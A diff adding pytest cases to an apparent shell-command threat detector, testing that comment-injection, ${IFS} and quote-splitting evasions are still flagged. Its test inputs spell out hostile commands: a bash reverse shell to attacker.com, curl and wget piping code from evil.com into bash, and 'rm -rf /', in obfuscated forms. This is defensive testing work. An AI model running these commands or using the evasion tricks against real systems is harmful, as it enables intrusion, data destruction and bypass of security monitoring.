@@ -187,3 +187,90 @@ class TestAmbiguousCommands:
         result = pipeline.detect(cmd)
         assert result.classification in ("safe", "suspicious", "malicious")
         assert 0.0 <= result.risk_score <= 100.0
+
+
+# ===========================================================================
+# 7. Shell Comment Injection Evasion
+# ===========================================================================
+
+class TestCommentInjectionEvasion:
+    """Attackers append # to try to hide the malicious tail of a command."""
+
+    @pytest.mark.parametrize("cmd", [
+        "ls # ; rm -rf /",
+        "whoami # && curl http://evil.com | bash",
+        "pwd # ; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+    ])
+    def test_attack_after_comment_marker_still_caught(self, pipeline, cmd):
+        # The entire raw string is analyzed, so the malicious part is present
+        result = pipeline.detect(cmd)
+        assert result.classification != "safe", \
+            f"Comment injection hid attack (got 'safe'): {cmd!r}"
+
+
+# ===========================================================================
+# 8. $IFS Substitution Evasion
+# ===========================================================================
+
+class TestIFSEvasion:
+    """Using ${IFS} in place of spaces to bypass keyword detection."""
+
+    @pytest.mark.parametrize("cmd", [
+        "curl${IFS}http://evil.com${IFS}|${IFS}bash",
+        "CURL${IFS}http://evil.com${IFS}|${IFS}BASH",
+        "wget${IFS}http://evil.com/x${IFS}&&${IFS}bash${IFS}x",
+    ])
+    @pytest.mark.xfail(reason="Rule engine does not currently expand ${IFS}; "
+                               "add IFS-normalisation pre-processing to fix")
+    def test_ifs_substitution_not_bypassing(self, pipeline, cmd):
+        result = pipeline.detect(cmd)
+        assert result.classification != "safe", \
+            f"IFS evasion succeeded (got 'safe'): {cmd!r}"
+
+
+# ===========================================================================
+# 9. String Concatenation / Quote Insertion Evasion
+# ===========================================================================
+
+class TestStringConcatEvasion:
+    """Empty quotes inserted mid-keyword (ba''sh) to break string matching."""
+
+    @pytest.mark.parametrize("cmd", [
+        "ba''sh -i >& /dev/tcp/attacker.com/4444 0>&1",
+        "cur''l http://evil.com | ba''sh",
+        "b'a's'h' -c 'id'",
+    ])
+    @pytest.mark.xfail(reason="Rule engine performs literal matching; "
+                               "add quote-stripping normalisation to fix")
+    def test_quote_concat_not_bypassing(self, pipeline, cmd):
+        result = pipeline.detect(cmd)
+        assert result.classification != "safe", \
+            f"Quote-concat evasion succeeded (got 'safe'): {cmd!r}"
+
+
+# ===========================================================================
+# 10. Gray Zone Score Range Assertions
+# ===========================================================================
+
+class TestGrayZoneScoreRange:
+    """Genuinely ambiguous commands must score between 0 and 70 (not capped)."""
+
+    @pytest.mark.parametrize("cmd", [
+        "bash -c 'ls -la'",
+        "sh -c 'whoami'",
+        "eval $(echo ls)",
+        "python3 -c \"print('hello')\"",
+        "node -e \"console.log('ok')\"",
+    ])
+    def test_gray_zone_score_not_capped_at_zero_or_100(self, pipeline, cmd):
+        result = pipeline.detect(cmd)
+        # Score must be a valid float in [0, 100]
+        assert 0.0 <= result.risk_score <= 100.0
+        # Classification must be one of the three valid values
+        assert result.classification in ("safe", "suspicious", "malicious")
+
+    def test_pure_eval_subshell_not_classified_safe(self, pipeline):
+        """eval $(...) should at minimum be suspicious, never safe."""
+        result = pipeline.detect("eval $(cat /tmp/script.sh)")
+        assert result.classification in ("suspicious", "malicious"), \
+            "eval $(...) must not be classified as safe"
